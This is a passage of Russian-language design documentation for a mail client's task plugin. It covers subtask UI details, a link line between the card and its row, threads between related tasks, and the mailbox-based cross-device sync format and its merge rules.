открывает карточку. Справа от названия — подписи, а не кнопки (ADR-0116): срок .step-due короткой датой и инициалы исполнителя .step-who в кружке цвета человека (OT.hue). Тон срока (data-tone = today | overdue) считает OT.stepWhen тем же счётом, что у срока задачи; у выполненного пункта тона нет — его срок уже не горит, а обе подписи приглушены. Больше STEPS_IN_ROW = 5 прячется за «ещё N пунктов»; с ADR-0116 эта строка раскрывает остальные пункты прямо в ленте (state.stepsAll, помнится в sessionStorage как steps.all, рядом со свёрнутостью), а под раскрытым списком стоит «Показать меньше» — и текст здесь собирается через OT.pluralWord, а не OT.plural: второе само подставляет число, и однажды это уже дало «ещё 2 2 пункта». Отступы считаны по сетке строки задачи (4 + 12 + 30 + 12 + 21 + 12 = 91 px до названия): направляющая border-left стоит на 46 px — ровно под кружком «сделано», а название пункта начинается на 91 px, то есть ровно под названием задачи. Пункты так «вырастают» из заголовка, а не висят между колонками; направляющая видна всегда (--border-2) и разгорается акцентом у задачи с открытой карточкой. Состояние пункта — атрибут data-done="1", а не класс done: класс с таким именем в этом же файле стилей уже занят круглой кнопкой «сделано», и строка пункта забирала себе её размеры (21×21). В карточке — раздел «Пункты»: счётчик, полоса прогресса, строки с крестиком по наведению и двумя значками .step-chip — срок (due) и исполнитель (who). Незаданные значки прозрачны и проявляются под курсором или фокусом, как крестик: восемь пунктов не должны превращаться в восемь рядов пустых полей. Заданные видны всегда: срок — датой того же тона, исполнитель — инициалами. Нажатие раскрывает правку прямо под строкой (.step-tray). Для срока — input type=date и быстрые кнопки «Сегодня», «Завтра», «+7 дней», «Как у задачи» (если у задачи есть срок и он другой), «Убрать» (если срок стоит). Для исполнителя — текущий человек с лицом и «×», ниже тот же peopleSearch, что у исполнителя задачи (todo.findPeople, человек из книги или написанное имя). Какой пункт раскрыт, помнит stepTray, поэтому раскрытие переживает перерисовку; фокус ставится только при первом раскрытии (fresh), а не при каждой перерисовке, и уже после того, как правка вставлена в карточку (setTimeout), — иначе фокус в поле поиска человека не попадал. Закрывает правку только её собственное действие: closeTray(step, kind) сбрасывает stepTray, лишь если раскрыта именно эта правка, — отложенный blur поля не закроет правку, которую человек тем временем раскрыл у другого пункта. Перед перерисовкой closeTray снимает фокус с поля правки: пока фокус в поле карточки, перерисовка откладывается, и правка осталась бы висеть. Поиск раздела (OT.matches) находит задачу и по имени исполнителя её пункта. Ниже — тихая строка-поле «Добавить пункт» (.step-add в .step-add-row.add-row, ADR-0160; раньше — «Ещё пункт»), которое после Enter оставляет фокус себе (список пишут подряд); ради этого поле помечено data-volatile="1" и не считается «правкой под курсором» (ADR-0099). При переносе между устройствами набор пунктов сливается как коллекция, а содержимое каждого — как скаляр: версия того, чей штамп свежее (ADR-0094). Порядок — отдельно, как скаляр: переставила одна сторона — её порядок, обе — более поздний (ADR-0134, orderSteps; тот же вызов в mergeTasks старого документа и в mergeTask папки «Задачи»). Срок и исполнитель — часть содержимого и едут вместе с пунктом; исполнитель на границе переводится в адрес ящика, как люди задачи (см. «Граница передаёт только знакомые поля» ниже).

Объекты у пунктов (ADR-0122). TodoSubtask.refs?: TodoAttachmentRef[] — ссылки пункта на объекты той же задачи ({ kind, key, pluginId? }), а не копии: письма остаются в item.messages, люди, встречи и объекты плагинов — в item.links, один объект может относиться к нескольким пунктам. Ключи канонические (canonicalStepRef в todo-identity.ts): письмо — Message-ID, если известен, иначе id; человек — адрес в нижнем регистре; встреча — eventId; объект плагина — key плюс pluginId. Уборка — в единственной точке записи: pruneStepRefs в TodoStore.write приводит ссылки к каноническому виду и снимает висячие и повторы, поэтому объект, ушедший из задачи любым путём (detach, перенос, объединение, слияние устройств), сам пропадает из пунктов. repointLetter ведёт ссылку за письмом при смене его id. Возможность todo.linkStep { id, stepId, kind, key, pluginId?, linked } — через undoable, за authorizePluginData(); объект обязан уже лежать в задаче, письмо можно назвать и messageId, и internetMessageId; предел MAX_REFS_PER_STEP = 20. Через ящик: SUBTASK_FIELDS пропускает refs, чужие ссылки отбираются поштучно (stepRefsFrom), правило равных штампов заполняет и refs — старые версии срезают поле, не двигая штамп. Кадр: действие OT.actions.linkStep(taskId, stepId, ref, linked) в boot.js; общие правила в app.js — OT.refOf, OT.pointsTo (узнавание тем же правилом, что canonicalStepRef), OT.taskObjects, OT.stepObjects (только объекты, которые в задаче ещё лежат), OT.stepsPointingTo, OT.openObject, OT.kindIcon (линейные SVG через createElementNS), OT.MAX_STEP_REFS. В карточке (panel.js): скрепка .step-chip.chip-refs первой в ряду значков пункта раскрывает stepTray.kind = 'refs' — .refs-tray со строками .ref-opt (role="checkbox", aria-checked, data-ref); после отметки выбор не закрывается, фокус возвращается на ту же строку через stepTray.focus; стрелки, Home/End и Escape обрабатываются на списке, Escape не доходит до документа и не закрывает карточку. Под строкой — метки .step-refs > .step-ref.kind-* (первые STEP_REFS_SHOWN = 4, дальше «ещё N»). Строка пункта принимает перетаскиваемое вложение своей задачи (OT.List.dragging(), подпись OT.List.badge('step') = «К ПУНКТУ», класс .ref-drop) и зовёт linkStep, а не moveAttachment. Со стороны объекта — зеркало: у вложения (если у задачи есть пункты) значок .pill.step-mark (класс set и число, когда объект отнесён; иначе проявляется под курсором) и пункт «К пункту…» в меню «⋯» открывают stepPicker — .menu.step-pick с теми же .ref-opt (role="checkbox", data-step), клавишами и пределом; после linkStep список перестраивается по OT.byId, строка под курсором или фокусом ставит пункту карточки .ref-peek, Escape гасится на меню и возвращает фокус на значок (data-pick). render() карточки сохраняет scrollTop у .panel-body, если перерисовывается та же задача. Порядок пунктов (ADR-0134). Порядок пунктов — порядок массива subtasks; отдельного поля нет. TodoStore.moveSubtask(id, stepId, toIndex): toIndex — место после перемещения, нецелое — отказ «Некорректное место пункта», за края поджимается; тот же пункт на то же место возвращает задачу без записи (штамп и revision() не двигаются), а undoable в таком случае шага не записывает. Пункты сворачиваются, но не исчезают из виду (ADR-0109). У блока li.steps появилась шапка .steps-head — она же ручка «свернуть»: треугольник .caret, слово «Пункты», счёт .steps-count («1 из 3») и короткая полоса выполнения .steps-bar.mini (72 × 2 px, класс full, когда закрыты все пункты). Кнопка — во всю ширину блока: попасть в строку легко, а прицеливаться в треугольник 8 × 8 — нет. Правила:

  • Свёрнутое остаётся честным. Свёрнутый блок (li.steps.closed) строки .step не рисует вовсе (stepRows возвращает li сразу после шапки), но счёт и полосу сохраняет: по свёрнутой задаче по-прежнему видно, что внутри есть работа и сколько её закрыто. Прятать пункты «под голый треугольник» нельзя — тогда сворачивание прячет саму мысль, что у задачи есть внутренность.
  • Доступность. На шапке aria-expanded ("true"/"false") и подпись, называющая задачу: «Свернуть пункты: <название>» / «Показать пункты: <название>».
  • Свёрнутость — состояние экрана, а не задачи. state.stepsClosed — Set идентификаторов задач в app.js; после переключения он сохраняется OT.remember('steps.closed', [...state.stepsClosed]) (ключ todo.steps.closed в sessionStorage кадра) и поднимается в boot.js рядом с filter/calm: state.stepsClosed = new Set(OT.recall('steps.closed', [])). В TodoItem и в общее хранилище задач не едет, между устройствами не роумится (ADR-0094) и не переживает перезапуск — как фильтр и поиск. По умолчанию всё раскрыто. С ADR-0156: «по умолчанию» теперь задаёт кнопка «пункты всех задач» (todo.steps.mode в localStorage, по ящику, переживает перезапуск), а state.stepsClosed — лишь исключения при раскрытом по умолчанию; при свёрнутом исключения — state.stepsOpen (todo.steps.open). Свёрнута ли задача, решает OT.stepsHidden(id); подробности — «Ежедневный разбор» выше.
  • Перерисовка не схлопывает и не теряет фокус. toggleSteps(id) правит Set, запоминает его и зовёт OT.render({ skipPanel: true }): карточку перерисовывать незачем, а Panel.relink() нужен — строки от сворачивания поехали по вертикали, и связь карточки со строкой считается заново. Фокус после пересборки ленты возвращается руками на ту же шапку — document.querySelector('.steps[data-steps="…"] .steps-head') через CSS.escape(id); ради этого у блока стоит li.dataset.steps = item.id. Без этого работающий с клавиатуры после первого же нажатия оказывался бы в начале страницы.
  • Вид. .steps.closed ужимается до одной строки (gap: 0, вертикальные отступы 3 px): воздух внутри свёрнутому блоку не нужен. Треугольник рисуется рамками, а не SVG (в ленте и так хватает узлов), и повёрнут на 90° в раскрытом виде.

Строка заметки → шаг (ADR-0103). Наведение на строку заметки показывает в её левом поле кружок с плюсом (.note-add), клик заводит из этой строки пункт; строка, уже ставшая шагом, показывает кружок пунктиром и не нажимается (хранилище различает пункты по id, дубль остановить может только интерфейс). Выделение нескольких строк мышью поднимает над ними плашку «Сделать N шагов» (.note-many) — каждая непустая строка становится отдельным пунктом, уже добавленные в счёт не идут. Оба органа управления живут в наложении .note-layer (pointer-events: none, у кнопок — auto) НАД заметкой: заметка редактируемая, и кнопка внутри неё стала бы её содержимым. Строка под курсором ищется по высоте курсора, а не по цели события — слева у заметки поле под кружок, и целью там оказывается сама заметка. При скрытии кружка забывается только вид: прокрутка карточки гасит его ровно между «прицелился» и «нажал», и привязка к строке обязана пережить это. Перед добавлением шагов ожидающее автосохранение заметки вызывается принудительно — пункт и заметка правят одну запись. Правило для любого плавающего органа управления над текстом: его положение обязано упираться в границы контейнера. Плашка встаёт над выделением, но если сверху не хватает места (выделение начинается с первой строки), уходит под него — иначе она вылезает за заметку и ложится на заголовок раздела. Состояние «строка уже стала шагом» показывается формой (галочка вместо плюса), а не только цветом рамки. Дата строки заметки стоит абсолютом в своей строке, а не плавающим блоком: у длинной строки плавающая дата не помещалась рядом и съезжала на следующую — на одной строке оказывалось два числа. У пустой строки даты нет вовсе.

Связь карточки со строкой (ADR-0157). Карточка стоит у правого края, строка — слева, между ними полоса пустоты, и глаз каждый раз заново ищет, о какой задаче речь. Поэтому от карточки к строке ведёт тонкая линия (svg.link в кадре: position: fixed, z-index: 29 — поверх ленты, но под карточкой, pointer-events: none). Она нарисована тем же почерком, что и нити между связанными задачами (ниже): общий модуль OT.Wire в dist/threads.js (файл грузится раньше panel.js) держит бусину, геометрию «колено и прямая», прочерчивание и появление знаков, а drawLink() в panel.js только раскладывает их. Устройство: сплошная точка «отсюда» (circle.thread-knot.from.link-from, r 4, со свечением) стоит у края карточки целиком — card.left − 5, левее бордера панели; колечко «сюда» (circle.thread-knot.link-to, r 3, заливка цвета карточки) — на правой рамке строки, линия кончается на его краю (strip.right + 3). Линия — path.link-line, сплошная var(--accent) 1.6 px с круглыми концами, без градиента (прежний градиент «в ноль у карточки» прятал как раз её начало) и без острия; под ней общее с нитями гало path.link-halo (светлая тема: 4 px, opacity .07, blur(2px); тёмная: 6 px, .16, blur(3.5px)). Цвет — тот же var(--accent), что у рамки активной строки: связь и «эта строка сейчас открыта» — одно высказывание. От нитей связь отличается одним: она главная, поэтому толще (1.6 против 1.4) и непрозрачна.

Геометрия — чистая функция OT.Wire.cardLink({ card, strip, edges, viewport }) от прямоугольников карточки, строки и .view; она возвращает { away, fromX, fromY, toX, toY, path } и, если строка за краем, ещё side и bead: { cx, top }, а null — когда ленты по высоте почти нет (между edges.top + 28 и edges.bottom − 28 меньше 24 px). Строка считается ушедшей, когда её середина выше edges.top + 28 или ниже edges.bottom − 28. Строка на экране: линия выходит из карточки напротив строки (fromY зажат в card.top + 22 … card.bottom − 22), а не из её заголовка — иначе через весь экран тянется вертикаль вдоль края карточки; панель растянута во всю высоту окна, поэтому линия почти всегда прямая, кубический изгиб (bend = 55 % коридора, 18…72 px) работает на краях. Задача уехала за край ленты — связь не прячется: начало переезжает в середину видимой части карточки ((max(card.top, 0) + min(card.bottom, innerHeight)) / 2), линия коленом (OT.Wire.knee) заворачивает в коридор между лентой и карточкой и по его середине (cx = (strip.right + card.left) / 2, но центр бусины не ближе 2 + 11 px к карточке) прямо идёт в бусину button.edge-bead.card у края ленты — верхняя бусина стоит на edges.top + 6, нижняя на edges.bottom − 30 (22 px высоты плюс 8 px отступа), линия кончается на её контуре и прячется под стеклом. Так линия одинаково длинная вверх и вниз (на 1440×900 около 400 px) и не перечёркивает текст задач; прежде начало прижималось к уровню края и до острия оставалось около 30 px. На очень низком окне, если прямой отрезок выходит короче MIN_RUN = 48 px, начало отодвигается от бусины. Колечко «сюда» за краем скрыто — «сюда» говорит бусина. Бусина раскрывается влево (.left-grow, позиция отсчитывается от правого края окна, чтобы подпись уходила в ленту, а не под карточку), щелчок — OT.Wire.reveal(row): scrollIntoView({ block: 'center', behavior: 'smooth' }) и вспышка .thread-found. Движение: при появлении связи (новая activeId) точка выскакивает первой (160 мс), линия прочерчивается за 420 мс cubic-bezier(.2,.8,.3,1) (pathLength = 1, пунктир «1 1», stroke-dashoffset 1 → 0), колечко проявляется к её концу (200 мс с задержкой 300), бусина «ловит» линию (edge-bead-in 220 мс с задержкой 300; при появлении на прокрутке — сразу). Смена смысла без смены задачи (${activeId} ${away}: строка пересекла край ленты) не чертит линию заново — она за 240 мс проявляется в новой форме; дальше просто следует за строкой — пересчёт на scroll (на перехвате: скроллится .view, а не документ), resize и каждую перерисовку, не чаще кадра (relink() → requestAnimationFrame). Уход — затухание .link.fading за 160 мс (бусина гаснет вместе с ним, потом display: none и удаление бусины); с prefers-reduced-motion — мгновенно и без анимаций. Связи нет вовсе, когда указывать правда некуда: карточка закрыта, лента скрыта (аналитика, граф), между лентой и карточкой меньше LINK_MIN_GAP = 24 px (на узком окне карточка накрывает ленту) или ленты не видно вовсе. Под коридор body.panel-open .page резервирует padding-right: 468px (ширина карточки 420 + 48). Покрытие: describe «связь карточки со строкой: якорь и бусина» в todo-frame-threads.test.ts (строка на экране — колечко на рамке; ниже и выше экрана — середина карточки и бусина в коридоре у края; низкое окно — отрезок не короче 48 px; бусина не залезает на карточку; ленты не видно — null), todo-visual.spec.ts (связь есть при открытой карточке; уехавшая задача возвращается щелчком по бусине .edge-bead.card; закрытая карточка связь убирает) и снимки e2e/todo-threads-look.spec.ts.

Нити между связанными задачами (ADR-0121). Ручная связь задач (state.relations, OT.tiesOf(id) — только рёбра related; общие вложения сюда не входят, у них свой значок — плашка «две сложенные карточки» в карточке задачи, ADR-0156) раньше была видна в ленте лишь числом «🔗 2». Теперь от задачи к каждой связанной тянется нить — дуга по левому полю ленты. Устройство (dist/threads.js, модуль OT.Threads):

  • Когда видны. Только когда о задаче думают: курсор на строке задачи или на её пунктах (после паузы SHOW_DELAY = 110 мс — пролетающий курсор не искрит), видимый фокус клавиатуры на строке, открытая карточка задачи. Старшинство — курсор, фокус, карточка; задача без связей ход не перехватывает. Карточка держит нити в тихом режиме (data-mode="rest": нить в 0,42 яркости, без гало), курсор — в полном (live). Уход курсора гасит нити через HIDE_DELAY = 160 мс затуханием: промежуток между строками — не повод мигать; уход из кадра целиком ловится по mouseout без relatedTarget. Перетаскивание задачи (dragstart) нити гасит — у жеста свои зоны «Связать»/«Объединить».
  • Геометрия. Кубическая кривая M x y0 C x−k y0, x−k y1, x y1 от левого края строки к левому краю связанной: выходит и входит горизонтально, как нитка, продетая сбоку. Ширина дуги растёт с расстоянием (5 + 0,045·Δy), дуги нескольких нитей вкладываются друг в друга с зазором LANE_GAP = 3,5 px и при нехватке поля сжимаются веером пропорционально — порядок «ближе — уже» сохраняется, нити не пересекаются и не сливаются. Предел — поле слева от ленты (x − 6, не больше MAX_BULGE = 26 px): на узком окне это 20 px отступа страницы.
  • Слой. Один svg.threads на document.body: position: fixed, z-index: 28 — под связью карточки (29) и под карточкой (30), pointer-events: none. Внутри — маска #threads-mask с вертикальным градиентом по высоте .view: нити растворяются в полосе EDGE = 24 px у краёв ленты, а не обрезаются о шапку. Узелки: у задачи-источника — сплошная точка с кольцом цвета фона и свечением (.thread-knot.from), у связанных — колечко с заливкой цвета карточки (сплошная точка тонула в фиолетовой рейке обычного приоритета). Связанная строка получает класс .tied — рамка в полутон акцента; .kin (подсветка при наведении на значок 🔗) не трогается, у класса один хозяин.
  • Связанная задача за краем ленты (ADR-0157). За каждым краем рисуется одна нить — к ближайшей из ушедших задач (середина строки выше edges.top + EDGE или ниже edges.bottom − EDGE), по самой внешней полосе своей стороны; она идёт «коленом и прямой» (OT.Wire.knee) прямо в бусину и кончается на её контуре, колечка у неё нет. Остальных ушедших в эту сторону считает число на бусине: пучок нитей, истаивающих у края, читался как штриховка, а не как «туда» (маска у краёв осталась страховкой). Бусина — та же, что у связи карточки: button.edge-bead.kin.up|down (OT.Wire.bead, z 28), стекло 22 px с кольцом акцента (10 %, в тёмной 14 %; под курсором 18 % / 22 %), стрелка — SVG-штрих svg.chev 1.6 px (путь M2.5 7.5 L6 4 L9.5 7.5, у .down повёрнут на 180°), а не символ шрифта; стоит на полосе своей нити (left = x_полосы − 11), по вертикали — edges.top + 6 / edges.bottom − 30. Содержимое пересобирается только при смене смысла (dataset.says = число и подпись), не на каждый кадр прокрутки. Под курсором бусина раскрывается вправо в плашку с названием задачи (ширина подписи едет от нуля), и наведение на неё нити не гасит; щелчок прокручивает ленту к ближайшей и коротко подсвечивает её (.thread-found). Бусина — button с aria-label и tabIndex = -1: с клавиатуры к связанной задаче ведут стрелки и список связей в карточке. Сразу с подписью плашка закрывала начало строки у края — нередко той самой связанной задачи.
  • Скрытая отбором. Строки нет в ленте (поиск, вкладка «Открытые»/«Готовые», фильтр из аналитики) — нить не тянется, указывать некуда. Вместо неё у задачи короткий пунктирный хвостик с пустым колечком (.thread-lost, .thread-lost-ring[data-count]), а подсказка значка 🔗 договаривает: «Не видно в ленте из-за отбора: N». Связь на удалённую задачу не рисуется вовсе.
  • Прокрутка и перерисовка. scroll на перехвате и resize пересчитывают положение не чаще кадра (requestAnimationFrame); List.render() и render() в boot.js зовут OT.Threads.refresh(). Нити к тем же задачам — те же элементы: прорастание (pathLength = 1, пунктир «1 1», stroke-dashoffset 1 → 0 за 420 мс с шагом 45 мс между нитями) проигрывается один раз на появление, а не на каждый щелчок по галочке. Ключ «те же нити» — id задачи, набор видимых связанных и число скрытых; смена режима (курсор ↔ карточка) меняет только яркость.
  • Цена. Работа только по событию и только для одной задачи: tiesOf — проход по связям, на каждую связанную — один querySelector и один getBoundingClientRect. Постоянной работы на сотнях задач нет; прокрутка без показанных нитей выходит из redraw сразу.
  • Темы и движение. Цвета — токены --accent, --bg, --card; гало общее со связью карточки — в тёмной теме шире и ярче (6 px, .16), на светлой тоньше и бледнее (4 px, .07); нити — 1.4 px, opacity .78 (тёмная .9). Хвостик «скрыта отбором» приведён к тому же семейству: штрих 1.4, точечный пунктир .1 3.2, колечко r 3. prefers-reduced-motion: reduce отключает прорастание, затухание, выезд бусины и волну «вот она» (вместо неё — ровная рамка).

Вкладку «Граф» нити не трогают: там связи показаны отдельно и целиком. Задачи следуют за человеком, а не за компьютером (ADR-0094)

С этапа 3 ADR-0123 этот перенос не ведётся. Задачи хранятся в папке «Задачи» ящика (настройка «Где хранить задачи», по умолчанию — в ящике; с ADR-0136 — своя у каждого ящика, в Настройках, «Плагины › Задачи» → «Где хранить задачи», для ящика из переключателя «Ящик» в шапке страницы (ADR-0155)), а скрытый документ при переезде читается последний раз и получает отметку «переехало». Ниже — как перенос был устроен: старые версии на других машинах работают именно так, и формат документа нужен для переезда.

Задачи оставались единственным, что жило только на одном компьютере: настройки, которые должны следовать за учётной записью, ездят через сам почтовый ящик с ADR-0042/ADR-0067. ADR-0094 переносит туда же и задачи — тем же транспортом, но с совсем другим слиянием: «последняя запись побеждает» по всему файлу потеряла бы чужую правку целиком.

Включает человек, и по умолчанию выключено. Поле sync в contributes.settings (off / on, форму рисует доверенный хост) — согласие на то, что содержимое задач уедет на сервер: темы и идентификаторы писем, адреса и имена людей, тексты заметок, хронология работы. Полный список и модель угроз — Безопасность → Содержимое задач уезжает в почтовый ящик. Работает, только когда подключён ровно один ящик: задачи общие на устройство, и складывать задачи про один ящик в другой программа не станет.

Строка состояния в кадре. Возможность todo.syncStatus — только чтение и только главное окно (ctx.authorizeMain(): строка называет почтовый ящик). Ответ — TodoSyncSummary { text, trouble }; кадр рисует её элементом #sync под шапкой (boot.js → syncLine()), при trouble — классом .trouble. Пока перенос выключен, строка молчит только до первой задачи: как только задачи есть, она говорит «Задачи хранятся только на этом компьютере. На других устройствах их не будет, пока не включён перенос: Настройки → Плагины → Задачи». Молчание здесь было бы не защитой приватности, а ловушкой: человек заводит десятки задач на работе и узнаёт, что они остались там, уже дома. Что ещё она может сказать: «Задачи хранятся в ящике <адрес>», «Перенос задач включён, но почтовый ящик не подключён», «Перенос задач выключен: подключено несколько ящиков, а задачи общие для всех», «Задачи в ящике не читаются» (с ADR-0115 это состояние не вечное: через две минуты движок заглядывает сам и, если документ понятный, но порванный, лечит его), «Задачи в ящике записаны более новой версией приложения. Обновите приложение» (не лечится — ADR-0115), «Метка этого устройства испорчена — перенос не пишет», «Задач стало больше, чем помещается в ящик», «Перенос остановлен: N записей эта версия не читает. Обновите приложение; если не поможет — сообщите об этом» (ADR-0112).

Номер учётной записи переводится на границе, а не в хранилище. Файл задач продолжает хранить местный accountId — он нужен и проверке прав, и отметке письма в списке, и автоматической укладке приходящей почты (ADR-0093). Меняются только выгрузка и загрузка: в документе ящик назван нормализованным почтовым адресом (PortableItem, поле mailbox вместо accountId), и приехавшая задача сразу получает МЕСТНЫЙ номер. Ящик, которого на этом устройстве нет, получает синтетический ext:<адрес> — выбрасывать такие задачи нельзя, иначе следующая отправка вернула бы в ящик обеднённый документ и данные пропали бы сразу на всех устройствах. Действия над ext:-ссылкой обработчик отклоняет сам (assertLocalAccount → «Это из ящика, который на этом устройстве не подключён»), а когда такой ящик здесь подключают, TodoStore.remapAccountIds('ext:<адрес>', accountId) переписывает номер во всех ссылках задач одной записью: в письмах, ссылках, исполнителе и постановщике, а с ADR-0116 — и в участниках, и в исполнителях пунктов. Участников этот перевод раньше пропускал, и их карточка открывалась бы через чужой ящик.

Граница передаёт только ЗНАКОМЫЕ поля — в обе стороны (ADR-0111). Ни fromDocument, ни toDocument не копируют поля скопом: список переносимых полей задан поимённо картой CARRIED в todo-sync.ts, а её тип — { [K in Exclude<keyof TodoItem, TranslatedField>]: true }, где TranslatedField — то, что переводится отдельно (messages, links, assignee, reporter, participants, subtasks). Это не перечисление для удобства, а защёлка: новое поле TodoItem, не внесённое в карту, роняет npm run typecheck, а не данные у человека. Вложенные объекты — письмо, человек, ссылка, пункт — собираются так же поимённо, потому что их проверки тоже смотрят только знакомые поля и лишнее улеглось бы в хранилище столь же тихо.

Пункт — тоже переводимое поле (ADR-0116). До исполнителя пункта subtasks лежали в CARRIED и ехали «как есть»: в пункте не было ничего местного. Исполнитель — человек с местным номером ящика, поэтому subtasks ушли в TranslatedField. В документе пункт — PortableSubtask (Omit<TodoSubtask, 'assignee'> & { assignee?: PortablePerson }): исполнитель назван адресом ящика (mailbox), обратно получает местный номер тем же person(), что исполнитель задачи. Человек в обе стороны собирается поимённо картой PERSON_FIELDS (address, name): исходящий person() в toDocument больше не копирует человека за вычетом accountId, а входящий person() в fromDocument отбрасывает человека без строкового непустого mailbox, вместо того чтобы завести ему «ящик undefined». Это касается и людей задачи, и исполнителей пунктов. Поля пункта отбирает карта SUBTASK_FIELDS типа { [K in Exclude<keyof TodoSubtask, 'assignee'>]: true } (id, title, done, dueDate) — и теперь в обе стороны: раньше исходящие пункты копировались целиком, и незнакомое местное поле пункта уехало бы соседям. Исполнитель пункта из ящика, который нельзя назвать адресом, делает задачу невыгружаемой (dropped) — ровно как исполнитель, постановщик и участники задачи. Плата прежняя: версии до ADR-0116 принимают у пункта только id, title, done и перезаписывают документ целиком при любой своей правке, срезая эти поля у всех пунктов. При равном штампе новое устройство вернёт поле из своей копии (правило tie в таблице слияния ниже), но если на старой версии правили саму задачу, её штамп свежее, и срок с исполнителем пункта пропадут везде. Откат на версию до ADR-0116 опаснее: она везёт пункты «как есть» и выгрузит исполнителя пункта с местным номером учётной записи и без ящика. Новая версия такого человека отбросит, но номер уже побывал в ящике.

Правило родилось из инцидента 28.09.2026 (подробности — ADR-0111): сборка, не знавшая про участников задачи, перенесла их из ящика «как есть» — в переносном виде, с mailbox вместо accountId. Своя проверка лишнего поля не видит, файл записался и считался исправным, а через три дня новая версия участников уже знала, проверила их строго и отвергла весь файл целиком. Сломалось не там, где виновато, и не сразу. Зеркальная половина правила так же реальна: ...item при выгрузке унёс бы в общий документ незнакомое местное поле вместе с местными номерами учётных записей внутри — ровно то, что ADR-0094 обещает не отправлять. Плата названа прямо: поле, добавленное новой версией, при обмене через старую машину теряется — данные человека дороже верности незнакомого поля.

Формат в ящике: опись (манифест) + части. Одна задача с тремя письмами — около двух килобайт, потолок — 1000 задач, поэтому нарезка сделана с первого дня, а не «как расширение потом». С ADR-0115 пишется только опись v2 с частями под именем поколения; v1 читается для совместимости.

// v2 — пишется
OutTalk.Tasks              { v:2, kind:'tasks', updatedAt, device, parts, hash: string[],
                             gen, seen: { [device]: gen } }                          // опись
OutTalk.Tasks.<gen>.1…8    { v:1, kind:'tasks.part', part, updatedAt, items, relations } // части

// v1 — только читается
OutTalk.Tasks              { v:1, kind:'tasks', updatedAt, device, parts, hash: string[] }
OutTalk.Tasks.1…8          { v:1, kind:'tasks.part', part, updatedAt, items, relations }
  • Поколение (gen) — randomBytes(8) в hex, новое на каждую запись; принимается только по ^[a-z0-9]{8,32}$ (GEN в todo-sync.ts), потому что идёт в имя записи в ящике. Опись с кривым gen — не наша (manifestLayout → null), то есть неудачное чтение. Опись новее нас — kind:'tasks' с v > 2 (isNewerManifest) или v2 с parts > MAX_PARTS — тоже не читается, но помечается newer и не лечится никогда: перезапись откатила бы формат у всех устройств. Зачем это нужно: под постоянными именами две машины, писавшие почти одновременно, оставляли в ящике части одной и опись другой — документ становился нечитаемым навсегда. Разные имена у одновременных записей это исключают: последняя опись всегда указывает на полный набор одного устройства.
  • seen — «устройство → поколение его последней записи, которую писавший прочитал и учёл». Пишущий переносит карту из прочитанной описи, убирает из неё себя и ставит себя последним: порядок ключей — это свежесть, и при переполнении (MAX_SEEN = 16) вытесняются самые давние. Метка устройства — ключ seen, то есть часть протокола: validDevice (^[A-Za-z0-9-]{1,64}$). Своя метка берётся из plugin-data/device.json через deviceTag() в ipc/plugins.ts, и негодная там заменяется новой случайной; движок с негодной меткой всё равно не пишет («Метка этого устройства испорчена — перенос не пишет»). В чужой описи readSeen отбрасывает кривые записи поштучно (метка не по форме, поколение не по GEN) и оставляет последние MAX_SEEN: раньше одна испорченная запись обнуляла всю карту, и удаления переставали расходиться у всех. Своей записи в карте нет — это «не знаю, учли ли меня», безопасная сторона.
  • Порядок записи: части → сверка (опись в ящике перечитывается; изменилась с начала обмена — своя опись не пишется, свои части убираются, повтор через RETRY_MS = 3 000, который заменяет уже назначенное двухминутное ожидание) → опись последней — она и есть точка фиксации → уборка частей прочитанной описи (для v1 — частей под постоянными именами) через необязательный port.remove. Уборка best-effort: ошибка глотается, лишняя запись полежит. Бесхозные наборы частей копятся — после редкой гонки уборки, падения между записью частей и описи или сбоя сети во время уборки: их никто не перечисляет. Каждый набор невелик, но в пределе это рост; сборщик (поиск скрытых элементов Root по классу IPM.Configuration.OutTalk.Tasks. и удаление всех, кроме текущего поколения) отложен — принятый риск ADR-0115.
  • hash — sha256 каждой части; собранный документ проверяется по нему.
  • Связи кладутся целиком в первую часть: делить список, осмысленный только целиком, значит плодить ещё один способ получить полуправду.
  • Опись, по которой нечего собрать, — это неудачное чтение, а не пустой ящик: на «пустом» движок решил бы, что все задачи удалены. Неудачное чтение сразу повторяется один раз: в документе v2 оно почти всегда значит, что другое устройство как раз убрало старые части между нашим чтением описи и чтением частей.
  • Читается ровно столько частей, сколько обещает опись (manifestLayout → { count, gen, seen }; partCount — её тонкая обёртка): каждое имя — обращение к серверу.
  • Пределы: MAX_PART_BYTES = 160 КБ при нарезке, MAX_PART_CHARS = 256 * 1024 на прочитанную и на записываемую часть, MAX_PARTS = 8. Не помещается — не пишется ничего.

Удаление — это отсутствие относительно БАЗЫ. База — последний документ, который действительно прочитали из ящика и слили; лежит рядом с задачами: userData/plugin-data/com.outtalk.todo.base.<sha1 адреса ящика>.json. С ADR-0115 в ней же лежит mine — поколение своей последней записи в ящик (null — неучтённой своей записи нет; поля нет — база записана до v2). После своей записи база сдвигается функцией settle: на подтверждённый документ — только если его поколение наше; иначе базой остаётся то, что прочитали перед слиянием (неполно прочитанное базой не становится — тогда остаётся прежняя), а mine всё равно становится поколением нашей записи. Надгробий нет — не нужно решать, сколько им жить, не нужно место под них в тесном документе и не нужен ответ на «а если значение вернули обратно». Плата названа прямо: потеря базы вырождает слияние в объединение — ничего не теряется, но удалённое на другом устройстве может один раз вернуться.

Чужой штамп поджимается до now + 24 ч (MAX_CLOCK_SKEW_MS): иначе устройство с уехавшими часами побеждало бы вечно. Сравнение коллекций — по ключам, а не перебором: документ приходит из ящика, и квадратичный проход по нему был бы заморозкой всего процесса main.

Когда идёт обмен. TodoStore.onWrite(listener) — единственная точка извещения о записи (другой точки записи в хранилище нет) — дёргает schedulePush(); pull() зовётся один раз при регистрации IPC плагинов. Склейка: PUSH_DEBOUNCE_MS = 5 000 и пол PUSH_FLOOR_MS = 30 000 — пакетные действия и стек отмены пишут в файл десятками раз подряд. Пока карантин не пуст, обмен не идёт (ADR-0112): store.quarantined() > 0 — и exchange() выходит с error = 'Перенос остановлен: N записей эта версия не читает. Обновите приложение; если не поможет — сообщите об этом', ничего не прочитав и не записав. Иначе выгрузка сработала бы как удаление: отсутствие задачи в документе значит «её удалили», и живая задача, которую эта версия просто не понимает, исчезла бы сразу на всех устройствах.

Обмен целиком:

  1. якорь захвачен (deps.anchor()) и сверен с памятью (reconcileAnchor, см. ниже): ext:<адрес якоря> переписывается на местный номер, а письма ящика, к которому эта учётная запись была привязана раньше, — обратно в ext:<прежний адрес>;
